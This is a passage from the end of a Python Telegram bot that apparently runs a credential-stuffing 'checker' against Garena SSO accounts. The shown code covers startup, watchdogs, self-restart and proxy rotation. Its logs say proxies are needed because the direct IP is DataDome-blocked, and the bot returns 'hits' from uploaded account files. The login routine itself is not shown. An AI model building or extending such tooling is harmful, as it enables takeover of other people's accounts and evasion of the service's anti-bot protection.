            for evt in _stop_events.values():
                evt.set()
    signal.signal(signal.SIGTERM, _graceful_shutdown)
    signal.signal(signal.SIGINT,  _graceful_shutdown)

    # ── Start Railway healthcheck server (responds to /health) ──
    _start_healthcheck_server()
    _touch_liveness()  # initial liveness touch

    proxy_file_names = [os.path.basename(p) for p in PROXY_FILES]
    logger.info(
        f"[GEO] Proxy rotator active -> {geo_rotator.current_proxy} "
        f"({geo_rotator.total} proxies) | Files: "
        f"{', '.join(proxy_file_names) if proxy_file_names else 'none found'}"
    )

    # ── Start Telegram bot ────────────────────────────────────
    BOT_MODE = True
    _cleanup_stale_files()
    if not BOT_TOKEN:
        logger.error("[MAIN] ❌ BOT_TOKEN is empty — cannot start Telegram polling!")
        logger.error("[MAIN] Set BOT_TOKEN environment variable and the bot will auto-detect it.")
        logger.error("[MAIN] Staying alive... waiting for config...")
        # Don't crash — just wait. The _get_or_create_config() wait loop
        # should have already handled this, but as an extra safety net:
        while not shutdown_event.is_set():
            time.sleep(30)
            # Re-check env vars
            new_token = os.environ.get("BOT_TOKEN", "").strip()
            if new_token:
                logger.info("[MAIN] ✅ BOT_TOKEN detected! Restarting...")
                os.execv(sys.executable, [sys.executable] + sys.argv)
        return
    start_bot_polling(BOT_TOKEN, None)
    _tg_set_commands(BOT_TOKEN)

    # ── Notify owner that bot has started/restarted ───────────────────
    try:
        _restart_count = _keysystem_api.load_state("restart_count") if _keysystem_api.enabled else {}
        if not isinstance(_restart_count, dict):
            _restart_count = {}
        count = _restart_count.get("count", 0) + 1
        _restart_count["count"] = count
        _restart_count["last_restart"] = time.time()
        if _keysystem_api.enabled:
            _keysystem_api.save_state("restart_count", _restart_count)
        _now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        _total_users = len({v.get("hits_id") for v in _saved_users.values() if isinstance(v, dict) and "hits_id" in v})
        _proxy_info = f"{geo_rotator.total} proxies" if hasattr(geo_rotator, "total") else "N/A"
        _tg_send(BOT_TOKEN, OWNER_ID,
            f"🤖 <b>Bot Restarted!</b>\n\n"
            f"🕐 <b>Time:</b> {_now}\n"
            f"🔄 <b>Restart #:</b> {count}\n"
            f"👥 <b>Total Users:</b> {_total_users}\n"
            f"🌐 <b>Proxies:</b> {_proxy_info}\n"
            f"🚀 <b>Status:</b> Online & Ready\n\n"
            f"👥 <b>Active Users:</b> Send /statuskey to see details"
        )
    except Exception as e:
        logger.warning(f"[MAIN] Failed to send restart notification: {e}")

    # ── Memory watchdog — 3-tier adaptive throttle ───────────────
    # Tier 1 (>80%): reduce to 3 threads (warn)
    # Tier 2 (>87%): reduce to 2 threads (critical)
    # Tier 3 (>93%): reduce to 1 thread  (emergency — stop new work)
    def _memory_watchdog():
        try:
            import psutil
        except ImportError:
            logger.warning("[WATCHDOG] psutil not installed — RAM watchdog disabled. Install with: pip install psutil")
            return

        # Track last tier to avoid log spam
        last_tier = 0

        while not shutdown_event.is_set():
            try:
                mem  = psutil.virtual_memory()
                pct  = mem.percent
                free = mem.available // (1024 * 1024)  # MB

                # ── Determine tier ─────────────────────────────────
                if pct >= 93:
                    tier   = 3
                    target = 1
                    label  = "🚨 EMERGENCY"
                elif pct >= 87:
                    tier   = 2
                    target = 2
                    label  = "🔴 CRITICAL"
                elif pct >= 80:
                    tier   = 1
                    target = 3
                    label  = "🟡 WARNING"
                else:
                    tier   = 0
                    target = MAX_GLOBAL_THREADS
                    label  = "🟢 OK"

                # ── Only act/log on tier change ─────────────────────
                if tier != last_tier:
                    if tier > 0:
                        # Force garbage collection on high memory
                        gc.collect()
                        logger.warning(
                            f"[WATCHDOG] {label} — RAM {pct:.1f}% ({free}MB free) "
                            f"→ throttling to {target} thread(s)"
                        )
                        # Drain excess semaphore slots down to target
                        drained = 0
                        while _global_thread_sem._value > target:
                            if _global_thread_sem.acquire(blocking=False):
                                drained += 1
                            else:
                                break
                        if drained:
                            logger.warning(f"[WATCHDOG] Drained {drained} slot(s) — semaphore now at {target}")
                    else:
                        # Recovering — restore semaphore to full
                        current = _global_thread_sem._value
                        restore = MAX_GLOBAL_THREADS - current
                        for _ in range(restore):
                            _global_thread_sem.release()
                        if restore:
                            logger.info(f"[WATCHDOG] 🟢 RAM recovered ({pct:.1f}%) — restored {restore} thread slot(s)")
                    last_tier = tier

                # Tier 3 emergency: notify owner via Telegram
                if tier == 3 and last_tier != 3:
                    try:
                        _tg_send(BOT_TOKEN, OWNER_ID,
                            f"🚨 <b>Server RAM Emergency!</b>\n\n"
                            f"RAM at <b>{pct:.1f}%</b> ({free}MB free)\n"
                            f"Throttled to 1 checker thread.\n"
                            f"<i>Consider stopping some checkers with /stopall</i>")
                    except Exception:
                        pass

            except Exception as e:
                logger.debug(f"[WATCHDOG] Error: {e}")

            # Periodic GC every cycle to keep memory lean on Railway
            try:
                gc.collect()
            except Exception:
                pass

            # Check every 8s — fast enough to catch spikes
            time.sleep(8)

    threading.Thread(target=_memory_watchdog, daemon=True, name="MemWatchdog").start()

    # ── Railway keep-alive heartbeat ─────────────────────────
    def _liveness_watchdog():
        """Enhanced heartbeat + liveness watchdog.
        Every 60s: log heartbeat and check liveness.
        If no activity for 5 minutes: warn.
        If no activity for 10 minutes: trigger self-healing restart."""
        stuck_warned = False
        while not shutdown_event.is_set():
            time.sleep(60)  # check every minute
            try:
                age = _get_liveness_age()
                active = sum(1 for s in _bot_state.values() if s == "RUNNING")

                if age > 600:  # 10 minutes — no activity at all
                    logger.error(f"[WATCHDOG] 🚨 Bot appears DEAD — no activity for {int(age)}s! Triggering self-healing restart...")
                    try:
                        _tg_send(BOT_TOKEN, OWNER_ID,
                            f"🚨 <b>Bot Self-Heal Triggered</b>\n\n"
                            f"No activity detected for <b>{int(age/60)} minutes</b>.\n"
                            f"Bot is restarting itself automatically.\n\n"
                            f"<i>You don't need to do anything.</i>"
                        )
                        time.sleep(3)  # give message time to send
                    except Exception:
                        pass
                    # Self-heal: full process restart
                    if _is_railway():
                        _railway_redeploy()
                    else:
                        os.execv(sys.executable, [sys.executable] + sys.argv)

                elif age > 300:  # 5 minutes — concerning
                    if not stuck_warned:
                        logger.warning(f"[WATCHDOG] ⚠️ Bot may be stuck — no activity for {int(age)}s")
                        stuck_warned = True
                        try:
                            _tg_send(BOT_TOKEN, OWNER_ID,
                                f"⚠️ <b>Bot May Be Stuck</b>\n\n"
                                f"No activity for <b>{int(age/60)} minutes</b>.\n"
                                f"Will auto-restart in 5 min if no recovery."
                            )
                        except Exception:
                            pass
                else:
                    stuck_warned = False  # recovered
                    logger.info(f"[HEARTBEAT] 💓 Bot alive | {active} active | liveness: {int(age)}s ago | threads: {MAX_GLOBAL_THREADS}")
            except Exception:
                pass
    threading.Thread(target=_liveness_watchdog, daemon=True, name="LivenessWatchdog").start()

    # ── Raw proxy auto-fetch (every 30 seconds from external sources) ──
    threading.Thread(target=_fetch_raw_proxies, daemon=True, name="RawProxyFetcher").start()

    # ── Startup diagnostic: verify auto-fetch thread is alive ──
    def _verify_proxy_fetch():
        """Wait 35s then verify the proxy fetcher actually ran and loaded proxies."""
        time.sleep(35)  # Wait for first fetch cycle (30s interval + buffer)
        log = logging.getLogger(__name__)
        pool_size = geo_rotator.total
        if pool_size > 0:
            log.info(f"[STARTUP] ✅ Proxy auto-fetch working — pool: {pool_size} proxies")
        else:
            log.error(f"[STARTUP] ❌ Proxy pool still 0 after 35s — auto-fetch may be broken!")
            log.error(f"[STARTUP] Check if proxy/ folder exists and sources are reachable")
            # Try to list proxy folder contents
            try:
                if os.path.exists(PROXY_FOLDER):
                    files = os.listdir(PROXY_FOLDER)
                    log.error(f"[STARTUP] proxy/ folder contents: {files}")
                else:
                    log.error(f"[STARTUP] proxy/ folder does NOT exist!")
            except Exception as e:
                log.error(f"[STARTUP] Cannot list proxy folder: {e}")
    threading.Thread(target=_verify_proxy_fetch, daemon=True, name="ProxyFetchVerify").start()

    # ── Startup proxy connectivity diagnostic ──
    def _startup_proxy_check():
        """Quick diagnostic: test if Garena SSO is reachable and warn if blocked."""
        time.sleep(3)  # Wait for proxy fetcher to run first
        log = logging.getLogger(__name__)
        pool_size = geo_rotator.total
        try:
            # Test direct connection
            resp = requests.get(
                "https://sso.garena.com/api/prelogin?app_id=10100&account=test&format=json&id=1",
                timeout=8, allow_redirects=False
            )
            if resp.status_code == 403:
                log.warning(f"[STARTUP] 🛡️ Direct IP is DataDome-blocked (403) — proxies REQUIRED")
                if pool_size == 0:
                    log.error(f"[STARTUP] ❌ NO PROXIES LOADED + IP BLOCKED = all accounts will fail!")
                    log.error(f"[STARTUP] 💡 Add working proxies to proxy/ folder or wait for auto-fetch")
                else:
                    log.info(f"[STARTUP] ✅ Proxy pool has {pool_size} proxies — should work")
            elif resp.status_code == 200:
                log.info(f"[STARTUP] ✅ Direct connection works (no DataDome block)")
                if pool_size > 0:
                    log.info(f"[STARTUP] 📦 Proxy pool: {pool_size} proxies available")
            else:
                log.info(f"[STARTUP] ℹ️ Garena SSO returned HTTP {resp.status_code}")
        except Exception as e:
            log.warning(f"[STARTUP] ⚠️ Cannot reach Garena SSO directly: {e}")
            if pool_size == 0:
                log.error(f"[STARTUP] ❌ NO PROXIES + no direct access = checker will fail!")

    threading.Thread(target=_startup_proxy_check, daemon=True, name="ProxyDiagnostic").start()

    bot_console.print(
        "[bold green]🤖 Bot is running![/bold green]\n"
        "[cyan]Flow: /start → level → hit type → upload file → progress bar → hits sent to your ID[/cyan]"
    )
    bot_console.print("[dim]Press Ctrl+C to stop.[/dim]\n")

    # Keep the main thread alive — catch ALL exceptions to prevent crash-exit
    # Also touches liveness every 30s so the watchdog knows we're alive.
    _main_loop_tick = 0
    while not shutdown_event.is_set():
        try:
            time.sleep(1)
            _main_loop_tick += 1
            if _main_loop_tick >= 30:  # touch liveness every 30s
                _touch_liveness()
                _main_loop_tick = 0
        except KeyboardInterrupt:
            break
        except Exception as e:
            logger.error(f"[MAIN] Unexpected error in main loop: {e}")
            time.sleep(2)   # brief pause then continue — don't exit


if __name__ == "__main__":
    # Top-level crash guard with exponential backoff + self-healing on Railway.
    # Instead of "giving up", triggers Railway redeploy or process restart.
    MAX_CRASH_RETRIES = 5         # internal retry limit
    crash_count = 0
    while crash_count < MAX_CRASH_RETRIES:
        try:
            shutdown_event.clear()   # reset shutdown flag for restart
            gc.collect()  # clean up before each run
            main()
            crash_count = 0  # reset on clean exit (shutdown_event set)
            break
        except KeyboardInterrupt:
            bot_console.print(f"\n[yellow]⚠️  Bot stopped by user[/yellow]")
            break
        except MemoryError:
            gc.collect()
            crash_count += 1
            bot_console.print(f"[red]✘ Memory error (crash {crash_count}/{MAX_CRASH_RETRIES}) — forcing GC and restarting in 10s...[/red]")
            time.sleep(10)
        except Exception as e:
            crash_count += 1
            logger = logging.getLogger(__name__)
            logger.error(f"[MAIN] ✘ Unexpected error (crash {crash_count}/{MAX_CRASH_RETRIES}): {e}", exc_info=True)
            # Exponential backoff: 30s, 60s, 120s, 240s, 480s
            backoff = min(30 * (2 ** (crash_count - 1)), 480)
            bot_console.print(f"[red]✘ Restarting in {backoff}s... (attempt {crash_count}/{MAX_CRASH_RETRIES})[/red]")
            if _is_railway():
                logger.error(f"[MAIN] Running on Railway — retry {crash_count}/{MAX_CRASH_RETRIES} in {backoff}s...")
                time.sleep(backoff)
            else:
                time.sleep(backoff)
    else:
        # ── All internal retries exhausted — SELF-HEAL instead of giving up ──
        logger = logging.getLogger(__name__)
        logger.error(f"[MAIN] ✘ Bot crashed {MAX_CRASH_RETRIES} times — triggering self-healing restart!")
        bot_console.print(f"[bold red]✘ Crashed {MAX_CRASH_RETRIES} times — self-healing restart![/bold red]")

        if _is_railway():
            # On Railway: trigger redeploy via API (or fall back to execv)
            # This ensures Railway knows about the restart and tracks it properly.
            try:
                _tg_send(BOT_TOKEN, OWNER_ID,
                    f"🚨 <b>Self-Healing Redeploy</b>\n\n"
                    f"Bot crashed {MAX_CRASH_RETRIES} times internally.\n"
                    f"Triggering Railway redeploy now.\n\n"
                    f"<i>Bot will be back online automatically.</i>"
                )
                time.sleep(3)
            except Exception:
                pass
            _railway_redeploy()
        else:
            # Not on Railway: just restart the process
            logger.info("[MAIN] Restarting process via os.execv...")
            os.execv(sys.executable, [sys.executable] + sys.argv)